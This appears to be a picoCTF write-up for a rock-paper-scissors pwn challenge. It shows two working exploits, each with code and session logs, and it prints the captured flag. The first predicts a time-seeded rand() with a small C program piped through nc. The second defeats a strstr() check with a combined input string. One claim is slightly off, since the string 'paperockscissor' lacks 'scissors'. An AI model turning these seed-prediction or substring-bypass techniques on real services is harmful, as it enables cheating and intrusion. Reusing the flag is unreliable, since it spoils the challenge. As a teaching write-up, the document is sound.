# RPS

## OVERVIEW & IDEA

- The challenge gives us a binary file and its source code.

- To get the flag, we will win 5 times consecutive. 

```c
if (play()) {
    wins++;
} else {
    wins = 0;
}

if (wins >= 5) {
    puts("Congrats, here's the flag!");
    puts(flag);
}
```

- The program uses a mapped array to specify if user lose or not.

```c
char* hands[3] = {"rock", "paper", "scissors"};
char* loses[3] = {"paper", "scissors", "rock"};
```

- The program use `rand()` with `seed` is `time(0)` to take random value of `computer_turn`, then it "compares" the `loses[computer_turn]` with `player_turn`. If the `player_turn` "equals" `loses[computer_turn]` then we win, otherwise, the computer win.

- We has 2 vulnerabilitis with 2 above algorithm. We can exploit with `time(0)` by specifying the timezone of server and got the pseudo-random number. Then we can know which selection will win computer. 

- Or we can take advantage the `char *strstr(const char *haystack, const char *needle);`. This function just checks if `needle` is in `haystack`. So, we can bypass it by input the `"rockpaperscissors"`, `loses[computer_turn]` always is in that input, thus we always win.

```c
int computer_turn = rand() % 3;
printf("You played: %s\n", player_turn);
printf("The computer played: %s\n", hands[computer_turn]);

if (strstr(player_turn, loses[computer_turn])) {
    puts("You win! Play again?");
    return true;
} else {
    puts("Seems like you didn't win this time. Play again?");
    return false;
}
```

## DETAILS & EXPLOIT

### EXPLOIT USING RAND()

- First, I check timezone of server

![img](/picoCTF/RPS/assets/server.png)

- Then I change my system timezone to the same timezone as server.

```
λ ~/Desktop/CTF/pwn/RPS/ timedatectl set-timezone America/New_York 
λ ~/Desktop/CTF/pwn/RPS/ timedatectl                              
               Local time: Wed 2023-01-25 14:49:59 EST  
           Universal time: Wed 2023-01-25 19:49:59 UTC  
                 RTC time: Wed 2023-01-25 19:50:01      
                Time zone: America/New_York (EST, -0500)
System clock synchronized: no                           
              NTP service: inactive                     
          RTC in local TZ: no
```

- After that, I write C program that feed the input to server.

```c
// filename: exp.c
// gcc -o input exp.c
#include<stdio.h>
#include<time.h>
#include<stdlib.h>
#include<unistd.h>

int main()
{
	sleep(1);
	char* hands[3] = {"rock", "paper", "scissors"};
	char* loses[3] = {"paper", "scissors", "rock"};
	for ( int i = 0 ; i < 5 ; i++ )
	{
		srand(time(0));
		printf("1\n");
		int computer_turn = rand() % 3;
		printf("%s\n", loses[computer_turn]);
	}
}
```

- Run this bash command and get the flag.

```
./input | nc saturn.picoctf.net 56981
```

```
λ ~/Desktop/CTF/pwn/RPS/ ./input | nc saturn.picoctf.net 56981    
Welcome challenger to the game of Rock, Paper, Scissors
For anyone that beats me 5 times in a row, I will offer up a flag I found
Are you ready?
Type '1' to play a game
Type '2' to exit the program
1
scissors
1
scissors
1
scissors
1
scissors
1
scissors


Please make your selection (rock/paper/scissors):
You played: scissors
The computer played: paper
You win! Play again?
Type '1' to play a game
Type '2' to exit the program


Please make your selection (rock/paper/scissors):
You played: scissors
The computer played: paper
You win! Play again?
Type '1' to play a game
Type '2' to exit the program


Please make your selection (rock/paper/scissors):
You played: scissors
The computer played: paper
You win! Play again?
Type '1' to play a game
Type '2' to exit the program


Please make your selection (rock/paper/scissors):
You played: scissors
The computer played: paper
You win! Play again?
Type '1' to play a game
Type '2' to exit the program


Please make your selection (rock/paper/scissors):
You played: scissors
The computer played: paper
You win! Play again?
Congrats, here's the flag!
picoCTF{50M3_3X7R3M3_1UCK_C85AF58A}
Type '1' to play a game
Type '2' to exit the program
```

### EXPLOIT WITH STRSTR()

- Just enter "paperockscissor" and win.

```
λ ~/Desktop/CTF/pwn/RPS/ nc saturn.picoctf.net 56981 
Welcome challenger to the game of Rock, Paper, Scissors
For anyone that beats me 5 times in a row, I will offer up a flag I found
Are you ready?
Type '1' to play a game
Type '2' to exit the program
1
1


Please make your selection (rock/paper/scissors):
paperockscissor
paperockscissor
You played: paperockscissor
The computer played: rock
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1
1


Please make your selection (rock/paper/scissors):
paperockscissor
paperockscissor
You played: paperockscissor
The computer played: scissors
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1
1
paperockscissor

Please make your selection (rock/paper/scissors):

paperockscissor
You played: paperockscissor
The computer played: scissors
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1
1


Please make your selection (rock/paper/scissors):
paperockscissor
paperockscissor
You played: paperockscissor
The computer played: rock
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1
1


Please make your selection (rock/paper/scissors):
paperockscissor
paperockscissor
You played: paperockscissor
The computer played: scissors
You win! Play again?
Congrats, here's the flag!
picoCTF{50M3_3X7R3M3_1UCK_C85AF58A}
Type '1' to play a game
Type '2' to exit the program
```

